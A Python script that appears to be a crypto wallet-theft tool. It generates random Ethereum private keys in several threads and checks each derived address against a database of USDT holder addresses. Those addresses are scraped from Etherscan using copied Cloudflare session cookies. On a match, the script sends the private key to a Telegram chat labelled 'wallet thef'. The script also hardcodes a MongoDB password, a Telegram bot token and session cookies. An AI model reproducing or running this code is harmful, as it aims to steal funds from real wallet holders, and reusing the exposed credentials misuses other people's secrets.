import json
import time
from secrets import token_bytes
from threading import Thread

import requests
import telebot
from bs4 import BeautifulSoup
from coincurve import PublicKey
from _pysha3 import keccak_256
import base

db = base.Base("mongodb://Roooasr:sedsaigUG12IHKJhihsifhaosf@mongodb:27017/")
bot = telebot.TeleBot('6085840572:AAFPSPcF6BOLPNpm-wbzKzRtmr8LuNirsmI')

def genKey():
    private_key = keccak_256(token_bytes(32)).digest()
    public_key = PublicKey.from_valid_secret(private_key).format(compressed=False)[1:]
    addr = keccak_256(public_key).digest()[-20:]

    return {"private_key": private_key.hex(), "addr":f"0x{addr.hex()}"}


def loadAdress():
    with open('Adress.json') as f:
        templates = json.load(f)

    for temp in templates:
        db.addAdress(temp['adr'])

def updateAdress():
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0'
    }
    coocie =  {
		"__cf_bm": "KkkMjOxDAH8U2CaXIwFT7vt3HYJAjdikhZuPklzjw0M-1679759809-0-Ad5Jwr+NN7/2bmuo7S+G612mBpaIas+ZZ7LoCqkpovynkYTtMEDCW7LXBV81hiRfcG49ngXU/EwjoopERkzUDzRQA5dtaUazk5fB10+oMJkKuQLzTGm9/ucFN+NSVO5xcQ==",
		"__cflb": "0H28vPcoRrcznZcNZSuFrvaNdHwh858EthAE4h12zRi",
		"_ga": "GA1.2.1594640058.1679748840",
		"_gid": "GA1.2.776781051.1679748840",
		"ASP.NET_SessionId": "omrqynh55gb3c1eccfjoinbw",
		"bitmedia_fid": "eyJmaWQiOiIzNzYwNTVlZWI0Yjc3NGM0MzQ0NzFiMzRiODkwNGQ4ZCIsImZpZG5vdWEiOiJjNWEwYmM0MDk4YTFmYmIyY2YxZjMzZjRlYjRhMTQ4NiJ9",
		"cf_chl_2": "d9f6509fe6caabc",
		"cf_clearance": "nplImhQuovqDk57fgjfjggd2p.9LrYOs1Gwwtgn_hck-1679759793-0-150"
	}

    for i in range(1000):
        url = f"https://etherscan.io/token/generic-tokentxns2?contractAddress=0xdac17f958d2ee523a2206206994597c13d831ec7&mode=&sid=514989c7974b94b325da09a73c3cdb40&m=light&p={i+1 }"
        response = requests.get(url,headers=headers,cookies=coocie)
        soup = BeautifulSoup(response.text, 'lxml')
        quotes = soup.find_all('a',class_="hash-tag text-truncate")
        for q in quotes:
            db.addAdress(q.get("href").split("?a=")[1])

def worker(number):
    time.sleep(int(number))
    print(f"Worker {number} start")
    while True:
        try:
            th = genKey()
            adr = db.getByAddres(th['addr'],th['private_key'])
            if adr == 1:
                bot.send_message(6276997355,f"wallet thef \nadr: {th['addr']}\npriv: {th['private_key']}")
        except:
            bot.send_message(6276997355,"worker error. wait 3 seck")
            time.sleep(3)

def checker():
    print(" checker start")
    while True:
        count = db.getAdressCount()
        bot.send_message(6276997355,f"wallet count: {count}")
        time.sleep(7200)


if __name__ == "__main__":
    time.sleep(5)
    bot.send_message(6276997355,"start updating....")
    #loadAdress()
    #updateAdress()
    bot.send_message(6276997355,"base update is finish....")

    tr = Thread(target=worker, args=("1"))
    tr.start()
    tr2 = Thread(target=worker, args=("2"))
    tr2.start()
    tr3 = Thread(target=worker, args=("3"))
    tr3.start()
    tr4 = Thread(target=worker, args=("4"))
    tr4.start()
    tr1 = Thread(target=checker, args=())
    tr1.start()